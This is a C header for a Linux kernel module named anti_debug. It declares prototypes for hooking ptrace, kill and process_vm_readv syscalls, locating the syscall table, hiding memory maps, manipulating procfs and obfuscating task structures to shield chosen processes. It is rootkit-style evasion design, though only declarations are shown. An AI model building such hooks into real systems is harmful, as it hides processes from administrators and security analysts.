#ifndef ANTI_DEBUG_H
#define ANTI_DEBUG_H

#include <linux/types.h>
#include <linux/pid.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/mutex.h>
#include <linux/workqueue.h>
#include <linux/timer.h>
#include <linux/rwlock.h>
#include <linux/version.h>

#define MAX_PROTECTED_PIDS 256
#define MAX_HOOKED_SYSCALLS 32
#define DEBUGGER_CHECK_INTERVAL 5000

struct protection_context {
    pid_t protected_pids[MAX_PROTECTED_PIDS];
    int protected_count;
    unsigned long syscall_hooks[MAX_HOOKED_SYSCALLS];
    void *original_handlers[MAX_HOOKED_SYSCALLS];
    int hook_count;
    struct ftrace_ops ftrace_ops;
    struct kprobe *kprobes;
    int kprobe_count;
    struct mutex pid_mutex;
    rwlock_t syscall_lock;
    struct timer_list debugger_timer;
    struct work_struct debugger_work;
    struct crypto_skcipher *skcipher;
    unsigned char encryption_key[32];
    unsigned char encryption_iv[16];
};

void init_anti_debug(struct protection_context *ctx);
void cleanup_anti_debug(struct protection_context *ctx);
int protect_process(pid_t pid);
int unprotect_process(pid_t pid);
int is_protected(pid_t pid);
asmlinkage long hooked_ptrace(long request, long pid, unsigned long addr, unsigned long data);
asmlinkage long hooked_kill(pid_t pid, int sig);
asmlinkage long hooked_process_vm_readv(pid_t pid, const struct iovec *lvec, unsigned long liovcnt, const struct iovec *rvec, unsigned long riovcnt, unsigned long flags);
int hide_memory_maps(pid_t pid);
int obfuscate_task_struct(struct task_struct *task);
void monitor_debugger_processes(struct work_struct *work);
void clear_hw_breakpoints(struct task_struct *task);
int manipulate_procfs(pid_t pid);
int hook_critical_syscalls(struct protection_context *ctx);
void unhook_syscalls(struct protection_context *ctx);
int install_kprobes(struct protection_context *ctx);
void remove_kprobes(struct protection_context *ctx);
void ftrace_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs);
unsigned long find_syscall_table_fallback(void);
int setup_encryption(struct protection_context *ctx);
void cleanup_encryption(struct protection_context *ctx);
int encrypt_data(struct protection_context *ctx, void *data, size_t len);
int decrypt_data(struct protection_context *ctx, void *data, size_t len);
void debugger_timer_callback(struct timer_list *t);
int hook_procfs_functions(void);
void unhook_procfs_functions(void);
int secure_module_memory(void);
void release_module_memory(void);

#endif